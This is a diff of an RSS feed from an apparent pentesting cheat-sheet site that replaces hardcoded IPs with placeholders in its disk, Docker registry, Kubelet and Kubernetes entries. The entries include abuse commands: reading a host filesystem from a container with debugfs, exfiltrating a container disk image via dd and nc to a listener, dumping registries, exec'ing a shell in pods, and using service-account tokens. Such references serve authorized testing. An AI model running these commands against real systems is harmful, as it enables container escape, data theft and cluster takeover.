@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/disk/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/disk/</guid>
-      <description>Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse #1: Read host&amp;rsquo;s filesystem from container (root) # Open target device debugfs /dev/sda1 # Exploit ls /root Abuse #2: Read container&amp;rsquo;s filesystem from host # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.</description>
+      <description>Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse #1: Read host&amp;rsquo;s filesystem from container (root) # Open target device debugfs /dev/sda1 # Exploit ls /root Abuse #2: Read container&amp;rsquo;s filesystem from host # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.g. dm-0) dd if=/dev/dm-0 | gzip -1 - | nc &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt; # Extract dm-0 gunzip dm-0.</description>
     </item>
     <item>
       <title>Docker</title>
@@ -26,21 +26,21 @@
       <link>https://tldrbins.github.io/docker_registry/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/docker_registry/</guid>
-      <description>Docker Registry API # List repos curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/_catalog # List of tags of this repo curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/&amp;lt;REPO_NAME&amp;gt;/tags/list # List manifest file for this tag (e.g. latest) curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/&amp;lt;REPO_NAME&amp;gt;/manifests/latest # Get a commit of the image curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/&amp;lt;REPO_NAME&amp;gt;/blobs/sha256:&amp;lt;BLOB_HASH&amp;gt;&amp;#39; Docker Registry Dump DockerRegistryGrabber # List repos python3 drg.py https://example.com -A &amp;lt;TOKEN&amp;gt; --list # Dump repo python3 drg.</description>
+      <description>Docker Registry API # List repos curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; &amp;lt;TARGET&amp;gt;/v2/_catalog # List of tags of this repo curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; &amp;lt;TARGET&amp;gt;/v2/&amp;lt;REPO_NAME&amp;gt;/tags/list # List manifest file for this tag (e.g. latest) curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; &amp;lt;TARGET&amp;gt;/v2/&amp;lt;REPO_NAME&amp;gt;/manifests/latest # Get a commit of the image curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; &amp;lt;TARGET&amp;gt;/v2/&amp;lt;REPO_NAME&amp;gt;/blobs/sha256:&amp;lt;BLOB_HASH&amp;gt;&amp;#39; Docker Registry Dump DockerRegistryGrabber # List repos python3 drg.py &amp;lt;TARGET&amp;gt; -A &amp;lt;TOKEN&amp;gt; --list # Dump repo python3 drg.</description>
     </item>
     <item>
       <title>Kubelet</title>
       <link>https://tldrbins.github.io/kubelet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/kubelet/</guid>
-      <description>Basic Commands # List all the pods on the node kubeletctl pods -s 10.10.11.10 # List running pods kubeletctl runningpods -s 10.10.11.10 # Exec command kubeletctl exec &amp;#34;/bin/bash&amp;#34; -p &amp;lt;POD_NAME&amp;gt; -c &amp;lt;CONTAINER_NAME&amp;gt; -s 10.10.11.10 Ref: kubeletctl</description>
+      <description>Basic Commands # List all the pods on the node kubeletctl pods -s &amp;lt;TARGET&amp;gt; # List running pods kubeletctl runningpods -s &amp;lt;TARGET&amp;gt; # Exec command kubeletctl exec &amp;#34;/bin/bash&amp;#34; -p &amp;lt;POD_NAME&amp;gt; -c &amp;lt;CONTAINER_NAME&amp;gt; -s &amp;lt;TARGET&amp;gt; Ref: kubeletctl</description>
     </item>
     <item>
       <title>Kubernetes</title>
       <link>https://tldrbins.github.io/kubernetes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/kubernetes/</guid>
-      <description>Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt Basic Commands # List all namespaces kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get namespaces # Get user permissions in current namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list # Get user permissions in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list -n &amp;lt;NAMESPACE&amp;gt; # List all pods kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get pods --all-namespaces # List pods in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.</description>
+      <description>Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt Basic Commands # List all namespaces kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; get namespaces # Get user permissions in current namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; auth can-i --list # Get user permissions in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; auth can-i --list -n &amp;lt;NAMESPACE&amp;gt; # List all pods kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; get pods --all-namespaces # List pods in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.</description>
     </item>
     <item>
       <title>lxd</title>
